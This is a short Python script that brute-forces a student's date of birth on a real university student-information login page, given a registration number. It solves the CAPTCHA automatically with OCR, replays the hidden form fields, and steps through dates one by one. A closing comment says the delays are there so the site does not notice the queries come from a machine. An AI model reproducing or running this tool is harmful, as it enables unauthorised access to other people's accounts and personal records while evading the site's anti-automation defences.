#reg no-140905542
#date format-dd/mm/yyyy
import requests , bs4 , sys, datetime, time
import textdetect
regNo=None
Year=None
Month=None


if(len(sys.argv)<2):
    print("Insufficient params")
    exit(0)
elif (sys.argv[1]=='-h'):
    print("sac_hi.py -reg_no -year -month \nmonth can be left null")
    exit(0)
elif(len(sys.argv)==3):
    regNo=int(sys.argv[1])
    Year==int(sys.argv[2])
elif(len(sys.argv)==4):
    regNo=int(sys.argv[1])
    Year=int(sys.argv[2])
    Month=int(sys.argv[3])
else:
    print("parameters entered incorrectly")
    exit(0)


if (Month ==None):
    Month=1
Date=1


accessable=False
retry=False

baseURL = 'https://sis.manipal.edu/'
studentAppend = "studlogin.aspx"
headers = {'User-Agent': 'Mozilla/5.0'}
mydata={"__EVENTTARGET": "","__EVENTARGUMENT": "","__VIEWSTATE": None,"__VIEWSTATEGENERATOR": None,"__EVENTVALIDATION": None,"txtroll": regNo,"txtdob": None,"txtCaptcha": None,"Button1":None}


dob=datetime.datetime(Year,Month,Date)

while((not accessable)):
    session=requests.Session()
    verFailure=False;dobFailure=False    
    siteFetch = requests.get(baseURL + studentAppend)
    '''
    if(siteFetch.status_code!=200 and siteFetch.status_code!=300):
        raise Exception("Site not found: %d" % siteFetch.status_code)
        exit(0)
    else:
        print("Accessed %s" %siteFetch.url)
    '''

    bSite = bs4.BeautifulSoup(siteFetch.text,"lxml")
    captchaTag = bSite.findAll("img")[-1]
    captchaAppend = captchaTag.get("src")
    img_file=requests.get(baseURL + captchaAppend)

    fl=open("CAPTCHA.jpg",'wb')
    for i in img_file.iter_content(256):
        fl.write(i)
    fl.close()
    CAPTCHA=textdetect.refine(textdetect.ocr("./CAPTCHA.jpg"))
    mydata["txtCaptcha"]=CAPTCHA

    fields=bSite.findAll("input")

    for _ in fields:
        try:
            mydata[_.attrs["id"]]=_.attrs["value"]
        except:
            pass
    
    mydata["txtdob"]=dob.strftime("%d/%m/%Y")
    cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
    time.sleep(10)
    
    req = requests.post(baseURL+studentAppend,headers=headers,data=mydata,cookies =cookies)
    retry=(not retry)
    if(req.url=="https://sis.manipal.edu/geninfo.aspx"):
        accessable=True
        print("required DOB: ")
        print(dob.strftime("%d/%m/%Y"))
    elif(not retry):       
        Date+=1;
        print(dob.strftime("%d/%m/%Y")+" failed\n")
        try:
            dob=datetime.datetime(Year,Month,Date)        
        except:
            Month=(Month%12)+1
            Date=1
            dob=datetime.datetime(Year,Month,Date)
    time.sleep(2)

print("EXISTENCE IS PAIN")



# The site realizes that it isn't humanely possible for a person to query so fast hence i've kept the total time delay for each check to be 13secs
